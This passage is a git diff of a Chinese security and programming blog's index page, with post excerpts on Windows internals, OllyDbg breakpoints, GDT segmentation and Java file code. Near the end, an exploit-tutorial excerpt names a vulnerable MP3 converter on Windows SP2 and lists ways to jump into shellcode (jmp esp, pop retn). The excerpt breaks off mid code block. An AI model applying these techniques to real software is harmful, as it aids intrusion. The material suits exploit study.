@@ -157,110 +157,6 @@
           <div id="js-content" class="content-ll">
             
   
-    <article id="post-windows操作系统的基本概念" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/windows操作系统的基本概念/">windows操作系统的基本概念</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/windows操作系统的基本概念/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>windows特性</p>
-</blockquote>
-<ol>
-<li>可移植性<br>软件分层的体系结构,只有硬件抽象层与硬件紧密关联(HAL).windows从32移植到64位CPU,只改动了少量代码。</li>
-<li>兼容性<br>API名称和调用接口的一致性。为支持DOS程序和16位Windows程序,引入环境子系统概念,不同环境子系统,向各自的应用程序提供API支持。</li>
-<li>健壮性和可靠性<br>用户模式和内核模式的划分。<br>应用程序要访问物理内存,物理端口,应用程序都需要向内核模式下的组件提出请求。</li>
-<li>可扩展性<br>将内核从执行体组件中分离。内核只负责线程调度工作.而执行程序组件包含其他操作系统组件,包括内存管理组件,进程管理组件等,安装模块化方法设计。</li>
-<li>性能<br>由于分层设计,各个层次调用带来性能损失.通过I/O异步设计,CPU不会浪费时间在I/O操作上。基于多进程和多线程,尽量可能多个线程保持同时运行。支持异步操作。</li>
-</ol>
-<blockquote>
-<p>操作系统分层 总体架构</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1.应用程序以来3个dll,然后这3个dll最后会调用ntdll.dll</span><br><span class="line">USER32.dll(窗口管理)		3个dll最后通过ntdll.dll调用</span><br><span class="line">GDI32.dll(GDI函数)      -----------------------------&gt; ntdll.dll</span><br><span class="line">KERNEL32.dll(内核调用函数 线程调度等)</span><br><span class="line">2.ntdll.dll调用系统服务</span><br><span class="line">Windows2000 下通过int 2e 进入内核</span><br><span class="line">windowsxp以及之后 通过sysenter 进入内核</span><br><span class="line">将参数和系统服务号传入系统服务。系统服务有一个系统服务描述表(System Service Descriptor Table)。根据系统服务号作为索引找到服务函数的函数地址。</span><br><span class="line">3.执行程序组件</span><br><span class="line">位于Ntoskrnl.exe的上层</span><br><span class="line">	(1)对象管理程序 windows定义了很多数据结构,这些数据结构就是对象,对象管理器用于创建,管理,回收对象组件.驱动开发中就涉及到驱动程序对象,设备对象等。</span><br><span class="line">	(2)进程管理程序 依赖对象管理程序和虚拟内存管理程序等</span><br><span class="line">	(3)虚拟内存管理程序 虚拟内存的申请,回收</span><br><span class="line">	(4)I/O管理器 负责发起I/O请求,统一为IRP请求形式,IRP包含设备操作的重要数据。包括读写操作,字节长度,通讯方式等</span><br><span class="line">	(5)配置管理程序 软件硬件配置信息,使用注册表的数据库保存数据。设备驱动程序根据注册表的信息进行加载</span><br><span class="line">4.驱动程序</span><br><span class="line">  处理方式:</span><br><span class="line">	(1)直接操作硬件,完成IRP</span><br><span class="line">	(2)转发到更底层的驱动,并等待底层驱动返回</span><br><span class="line">	(3)不急于完成。分配新的IRP发到其他驱动程序,并等待返回。</span><br><span class="line">5.内核</span><br><span class="line">	执行在最高特权之上,通过自旋锁提供对多处理器同步的支持</span><br><span class="line">	包含以下功能:对内核对象的支持,对线程的调度,对多处理器同步的支持,中断处理函数的支持,对错误陷阱的支持,对错误陷阱的支持,对其他硬件特殊功能的支持。</span><br><span class="line">	调度线程的时候不能被其他线程打断,即不能允许线程的切换.但是可以被更高的中断请求级别(IRQL)打断。</span><br><span class="line">6.硬件抽象层</span><br><span class="line">	驱动也可以操作硬件抽象层,尽量使用硬件抽象层的宏而不适用汇编例如IN,OUT</span><br><span class="line">7.windows与微内核</span><br><span class="line">	操作系统主要组件运行与独立的进程中,有私有的地址空间。</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>从应用程序到驱动程序</p>
-</blockquote>
-<p>对所有硬件设备的操作都以普通文件看待。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CreateFile CloseHandle ReadFIle WirteFile CancelIo DeviceControl</span><br><span class="line">等操作</span><br><span class="line">实例:</span><br><span class="line">		CreateFile							</span><br><span class="line">应用程序------------&gt;win32子系统(Kernel32.dll)--------&gt;ntdll.dll</span><br><span class="line">									创建并发送IRP</span><br><span class="line">--------&gt;系统服务函数--------&gt;I/O管理器-----------&gt;设备驱动---------&gt;</span><br><span class="line">硬件抽象层---------&gt;硬件</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>虚拟内存</p>
-</blockquote>
-<p>DriverEntry例程和AddDevice例程是运行在系统system进程中.system进程是windows第一个运行的进程。需要加载驱动时,该进程会有一个线程将驱动程序加载到内核模式地址空间并调用DriverEntry例程。<br>而IRP_MJ_READ和IRP_MJ_WRITE的派遣函数运行于应用程序的上下文中。通过PsGetCurrentProcess函数得到当前运行的进程。</p>
-<ul>
-<li>Lookaside结构<br>当申请和回收内存的操作十分频繁的时候。考虑使用Lookaside对象</li>
-</ul>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window内核编程</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/windows操作系统的基本概念/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
     <article id="post-windows异常与调试" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -456,6 +352,193 @@
         <!-- 目录内容结束 -->
 
   
+    <article id="post-下断技巧" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/下断技巧/">下段技巧</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/下断技巧/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ol>
+<li>畸形RetAddr断点<br>将返回函数地址修改为一个非法地址(0xFFFFFFFF),调试时会触发非法内存访问错误,使调试器中断,从而能通过栈回溯找到上一次函数调用</li>
+<li>设置条件断点或者记录断点<br>ollydbg 条件断点(shift+F2) 条件记录断点(shift+F4)<br>条件表达式格式:<br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg01.png" alt="摘自0day书"><br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg02.png" alt="摘自0day书"><br>实例:<br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg03.png" alt="摘自0day书"><br>3.消息断点<br>调试UI程序时常用技巧<br>下断在TranslateMessage:bp TranslateMessage MSG==WM_LBUTTONUP<br>alt+F9返回到主程序领空<br>然后进入DispatchMessage函数,在代码段下内存访问断点,第一次断点即为按钮所执行代码<br>4.内存断点和硬件断点<br>5.常见断点<br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg_nor_bk01.png" alt="摘自0day书"><br><img src="http://picture.jbyusk.com:8080/ollydbg/ollydbg_nor_bk02.png" alt="摘自0day书"></li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">漏洞分析</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/下断技巧/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
+    <article id="post-windows操作系统的基本概念" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/windows操作系统的基本概念/">windows操作系统的基本概念</a>
+    </h1>
+  
+
+		
+        
+        <a href="/2018/08/20/windows操作系统的基本概念/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>windows特性</p>
+</blockquote>
+<ol>
+<li>可移植性<br>软件分层的体系结构,只有硬件抽象层与硬件紧密关联(HAL).windows从32移植到64位CPU,只改动了少量代码。</li>
+<li>兼容性<br>API名称和调用接口的一致性。为支持DOS程序和16位Windows程序,引入环境子系统概念,不同环境子系统,向各自的应用程序提供API支持。</li>
+<li>健壮性和可靠性<br>用户模式和内核模式的划分。<br>应用程序要访问物理内存,物理端口,应用程序都需要向内核模式下的组件提出请求。</li>
+<li>可扩展性<br>将内核从执行体组件中分离。内核只负责线程调度工作.而执行程序组件包含其他操作系统组件,包括内存管理组件,进程管理组件等,安装模块化方法设计。</li>
+<li>性能<br>由于分层设计,各个层次调用带来性能损失.通过I/O异步设计,CPU不会浪费时间在I/O操作上。基于多进程和多线程,尽量可能多个线程保持同时运行。支持异步操作。</li>
+</ol>
+<blockquote>
+<p>操作系统分层 总体架构</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1.应用程序以来3个dll,然后这3个dll最后会调用ntdll.dll</span><br><span class="line">USER32.dll(窗口管理)		3个dll最后通过ntdll.dll调用</span><br><span class="line">GDI32.dll(GDI函数)      -----------------------------&gt; ntdll.dll</span><br><span class="line">KERNEL32.dll(内核调用函数 线程调度等)</span><br><span class="line">2.ntdll.dll调用系统服务</span><br><span class="line">Windows2000 下通过int 2e 进入内核</span><br><span class="line">windowsxp以及之后 通过sysenter 进入内核</span><br><span class="line">将参数和系统服务号传入系统服务。系统服务有一个系统服务描述表(System Service Descriptor Table)。根据系统服务号作为索引找到服务函数的函数地址。</span><br><span class="line">3.执行程序组件</span><br><span class="line">位于Ntoskrnl.exe的上层</span><br><span class="line">	(1)对象管理程序 windows定义了很多数据结构,这些数据结构就是对象,对象管理器用于创建,管理,回收对象组件.驱动开发中就涉及到驱动程序对象,设备对象等。</span><br><span class="line">	(2)进程管理程序 依赖对象管理程序和虚拟内存管理程序等</span><br><span class="line">	(3)虚拟内存管理程序 虚拟内存的申请,回收</span><br><span class="line">	(4)I/O管理器 负责发起I/O请求,统一为IRP请求形式,IRP包含设备操作的重要数据。包括读写操作,字节长度,通讯方式等</span><br><span class="line">	(5)配置管理程序 软件硬件配置信息,使用注册表的数据库保存数据。设备驱动程序根据注册表的信息进行加载</span><br><span class="line">4.驱动程序</span><br><span class="line">  处理方式:</span><br><span class="line">	(1)直接操作硬件,完成IRP</span><br><span class="line">	(2)转发到更底层的驱动,并等待底层驱动返回</span><br><span class="line">	(3)不急于完成。分配新的IRP发到其他驱动程序,并等待返回。</span><br><span class="line">5.内核</span><br><span class="line">	执行在最高特权之上,通过自旋锁提供对多处理器同步的支持</span><br><span class="line">	包含以下功能:对内核对象的支持,对线程的调度,对多处理器同步的支持,中断处理函数的支持,对错误陷阱的支持,对错误陷阱的支持,对其他硬件特殊功能的支持。</span><br><span class="line">	调度线程的时候不能被其他线程打断,即不能允许线程的切换.但是可以被更高的中断请求级别(IRQL)打断。</span><br><span class="line">6.硬件抽象层</span><br><span class="line">	驱动也可以操作硬件抽象层,尽量使用硬件抽象层的宏而不适用汇编例如IN,OUT</span><br><span class="line">7.windows与微内核</span><br><span class="line">	操作系统主要组件运行与独立的进程中,有私有的地址空间。</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>从应用程序到驱动程序</p>
+</blockquote>
+<p>对所有硬件设备的操作都以普通文件看待。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CreateFile CloseHandle ReadFIle WirteFile CancelIo DeviceControl</span><br><span class="line">等操作</span><br><span class="line">实例:</span><br><span class="line">		CreateFile							</span><br><span class="line">应用程序------------&gt;win32子系统(Kernel32.dll)--------&gt;ntdll.dll</span><br><span class="line">									创建并发送IRP</span><br><span class="line">--------&gt;系统服务函数--------&gt;I/O管理器-----------&gt;设备驱动---------&gt;</span><br><span class="line">硬件抽象层---------&gt;硬件</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>虚拟内存</p>
+</blockquote>
+<p>DriverEntry例程和AddDevice例程是运行在系统system进程中.system进程是windows第一个运行的进程。需要加载驱动时,该进程会有一个线程将驱动程序加载到内核模式地址空间并调用DriverEntry例程。<br>而IRP_MJ_READ和IRP_MJ_WRITE的派遣函数运行于应用程序的上下文中。通过PsGetCurrentProcess函数得到当前运行的进程。</p>
+<ul>
+<li>Lookaside结构<br>当申请和回收内存的操作十分频繁的时候。考虑使用Lookaside对象</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window内核编程</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/windows操作系统的基本概念/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+ <!-- 目录内容 -->
+             
+        <!-- 目录内容结束 -->
+
+  
     <article id="post-windows网络编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -527,177 +610,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2018/08/20/windows网络编程/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-分段机制-32位下的gdt" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/分段机制-32位下的gdt/">分段机制_32位下的gdt</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/分段机制-32位下的gdt/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <blockquote>
-<p>段寄存器</p>
-</blockquote>
-<p>8086段寄存器有CS,DS,ES,SS<br>32位处理器中,增加了FS,GS<br>段寄存器中可见部分为16位的段选择子,不可见部分为描述符高速缓存器，存放段的基地址,范围和段属性。<br><img src="http://picture.jbyusk.com:8080/gdt/gdt_1.jpg" alt=""><br>T1 = 0时使用gdt,T1 = 1时使用ldt<br>RPL为0,1,2,3环,表示权限<br>index在T1 = 0下,表示在gdt表的第几项</p>
-<blockquote>
-<p>gdtr-全局描述符表寄存器</p>
-</blockquote>
-<p>gdtr为48位<br>高32位为gdt的基地址<br>低16位为gdt的项个数</p>
-<blockquote>
-<p>gdt 描述表</p>
-</blockquote>
-<p><img src="http://picture.jbyusk.com:8080/gdt/gdt_2.jpg" alt=""><br>G 粒度位,0时,粒度位字节,1时,粒度位4kb<br>D/B 默认操作大小(0=16位段;1=32位段)<br>L 64位代码段<br>AVL 可供系统软件使用<br>P 描述符有效位 为1时段描述符有效<br>DPL 描述符特权级别<br>S 描述符类型(0=系统段,1=代码段或数据段)<br>TYPE 段的类型 4位<br>当S=1:<br><img src="http://picture.jbyusk.com:8080/gdt/gdt_3.jpg" alt=""><br>最高位=0为数据段,最高位=1为代码段<br>对于数据段默认可读,E=1为向下扩展,E=0为向上扩展<br>                 W=1为可写,W=0为不可写<br>对于代码段默认可执行,C=1为一致性段,C=0为非一致性段<br>                 R=1为可读,R=0为不可读</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内核编程</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/分段机制-32位下的gdt/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-JAVA文件操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/JAVA文件操作/">JAVA文件操作</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/08/20/JAVA文件操作/" class="archive-article-date">
-  	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">public static File CreateDIr(String Filepath)&#123;</span><br><span class="line">        File file = new File(Filepath);</span><br><span class="line">        if(!file.exists())&#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                file.mkdir();</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public static File CreateFile(String Filepath)&#123;</span><br><span class="line">        File file = new File(Filepath);</span><br><span class="line">        if(!file.exists())&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    file.createNewFile();</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                    return null;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String ReadFile(File file)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            //1.创建文件输入流对象</span><br><span class="line">            FileInputStream inputStream = new FileInputStream(file);</span><br><span class="line">            //2.创建字节输出流对象</span><br><span class="line">            ByteArrayOutputStream byteArrayOutStream = new ByteArrayOutputStream();</span><br><span class="line">            //3.创建字节数组</span><br><span class="line">            byte bytes[] = new byte[1024];</span><br><span class="line">            int nReadNum = 0;</span><br><span class="line">            //使用文件输入流对象读取文件内容</span><br><span class="line">            while((nReadNum = inputStream.read(bytes,0,1024))!= -1)&#123;</span><br><span class="line">                byteArrayOutStream.write(bytes,0,nReadNum);</span><br><span class="line">            &#125;</span><br><span class="line">            return new String(byteArrayOutStream.toByteArray());</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static  String WriteFile(File file,String content)&#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            //1.创建文件输入流对象</span><br><span class="line">            FileOutputStream OutputStream = new FileOutputStream(file);</span><br><span class="line">            //2.创建字节数组</span><br><span class="line">            byte bytes[] = content.getBytes();</span><br><span class="line">            int nReadNum = 0;</span><br><span class="line">            //使用文件输出流对象输出内容</span><br><span class="line">            OutputStream.write(bytes);</span><br><span class="line">        &#125;</span><br><span class="line">        catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static String DeleteFile(File file)&#123;</span><br><span class="line">        if(file.exists())&#123;</span><br><span class="line">            if(file.isFile())&#123;</span><br><span class="line">                file.delete();</span><br><span class="line">            &#125;</span><br><span class="line">            else if(file.isDirectory())&#123;</span><br><span class="line">                File[] files = file.listFiles();</span><br><span class="line">                for(int i=0;i&lt;files.length;i++)&#123;</span><br><span class="line">                    DeleteFile(files[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                file.delete();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return  null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/20/JAVA文件操作/">展开全文 >></a>
         </p>
       
 
@@ -811,20 +723,20 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-逆向基础03" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-迫使shellcode执行方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/20/逆向基础03/">逆向基础03</a>
+      <a class="article-title" href="/2018/08/20/迫使shellcode执行方法/">exploit_2_迫使shellcode执行方法</a>
     </h1>
   
 
 		
         
-        <a href="/2018/08/20/逆向基础03/" class="archive-article-date">
+        <a href="/2018/08/20/迫使shellcode执行方法/" class="archive-article-date">
   	<time datetime="2018-08-20T08:46:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
 </a>
         
@@ -833,30 +745,28 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <blockquote>
-<p>vs全家桶-gs/堆栈/堆栈变量</p>
-</blockquote>
+        <p>实验版本:<br>windows sp2<br>Easy RM to MP3 2.7.3.700<br>ollydbg</p>
+<p>跳转方法:</p>
 <ul>
-<li>checkStackVars<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.lea edx,xxxx</span><br><span class="line">  call xxx</span><br><span class="line">2.call内部对0xccccccc进行判断</span><br><span class="line">3.函数一般在函数末尾</span><br></pre></td></tr></table></figure>
+<li>jmp/call<br>如果有寄存器可以利用来跳转到shellcode,则可以使用该方法来进行跳转<br>例如:jmp esp/call esp</li>
+<li>pop retn/popad<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 